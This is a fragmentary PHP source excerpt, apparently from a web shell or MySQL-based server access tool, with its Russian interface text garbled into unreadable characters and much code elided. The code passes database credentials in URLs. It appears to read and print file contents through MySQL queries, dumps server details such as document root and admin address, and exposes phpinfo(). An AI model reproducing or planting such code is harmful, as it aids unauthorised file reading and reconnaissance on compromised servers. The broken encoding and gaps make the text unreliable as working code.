...
<table align=center border=0 width=80% cellpadding=2 cellspacing=0 bgcolor=#FFFFFF>
 <tr>
   ...
   <td background=".$self."?img=st_form_bg bgcolor=#E6E7E9><center><font size=2>
        ...
        <li>���� ����� ����� mysql �� ������ ����, �� ��������� ������������� ��� ��������� ��������.</li>
        <li>���� ������ ����� mysql �� ������ ����, �� ��������� ������������� ������ ������.</li>
        <li>���� ��� �������� mysql �� ������� ����, �� ��������� ������������� <b>localhost</b></li>
        <li>���� ���� ��� �������� mysql �� ������ ����, �������������  ���� �� ���������, ������ (<b>3306</b>)<br><br></li>
...
<table width=80% align=center border=0 cellpadding=5 cellspacing=1> 
 <tr>
   ...
   <td align=center>
        <a href=\"$self?s=$s&php=ok&_login=$login&_passwd=$passwd&_server=$server&_port=$port\" target=\"_blank\"><b>���������� PHP (ALL)</b></a>
   </td>
   <td align=right>
...
if(isset($p_file)){ 
	...
	print "<br /><table align=center border=0 cellpadding=5 cellspacing=1 width=90% bgcolor=#FFFFFF><tr><td align=center bgcolor=#DBDCDD>�������� �����</td></tr>
		...
		<input type=\"submit\" value=\"�������� ����\"></form><br /><div style = \"width: 850px;overflow: scroll;border: dotted 1px #ccc;\"><tt><pre>";

	while ($line = mysql_fetch_array($result, MYSQL_ASSOC)) {
		foreach ($line as $key =>$col_value) {        
			if(!strlen($col_value)) {
				echo "<div style = \"text-align: center;\"><strong style = \"color: #900;\">�� ������� ��������� ����.</strong></div>";
			} else {
...
if (isset($apc) && $apc=="TRUE"){
 ...
 <table align=center border=0 cellpadding=0 cellspacing=1 width=80% bgcolor=#FFFFFF>
  ...
  <tr bgcolor=#DAD9D9><td>��� Internet-�����</td><td>".$_SERVER["SERVER_NAME"]."</td></tr>
  <tr bgcolor=#DAD9D9><td>IP-����� �����</td><td>".$_SERVER["SERVER_ADDR"]."</td></tr>
  <tr bgcolor=#DAD9D9><td>���� Web-�������.</td><td>".$_SERVER["SERVER_PORT"]."</td></tr>
  <tr bgcolor=#DAD9D9><td>������������ CGI ���������.</td><td>".$_SERVER["GATEWAY_INTERFACE"]."</td></tr>
  <tr bgcolor=#DAD9D9><td>�������� ��� ������� ������ �������� (�����).</td><td>".$_SERVER["REQUEST_METHOD"]."</td></tr>
  <tr bgcolor=#DAD9D9><td>Root ���������� ��� ������� ������������.</td><td>".$_SERVER["DOCUMENT_ROOT"]."</td></tr>
  <tr bgcolor=#DAD9D9><td>��������� �������� �������.</td><td>".$_SERVER["HTTP_CONNECTION"]."</td></tr>
  <tr bgcolor=#DAD9D9><td>��������� httpd.conf (SERVER_ADMIN).</td><td>".$_SERVER["SERVER_ADMIN"]."</td></tr>
  <tr bgcolor=#DAD9D9><td>��������� �������.</td><td>".$_SERVER["SERVER_SIGNATURE"]."</td></tr>
 </table><br>";
 unset($apc);
}
...
/*���������� php*/
if (isset($php) && $php=='ok'){
echo "<br /><div style = 'text-align:center;font-size: 300%'><a href = '$self'>�����</a></div><br />";
phpinfo();
echo "<br /><div style = 'text-align:center;font-size: 300%'><a href = '$self'>�����</a></div><br />";
}
